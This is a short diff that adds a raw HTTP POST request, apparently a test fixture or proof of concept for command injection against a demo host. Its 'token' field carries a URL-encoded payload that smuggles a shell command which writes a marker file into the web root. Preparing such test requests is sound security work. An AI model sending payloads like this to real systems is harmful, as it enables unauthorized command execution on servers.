@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 51
+Connection: close
+
+token=%3B+echo+evil+%3E+%2Fvar%2Fwww%2Fhtml%2Fc.txt
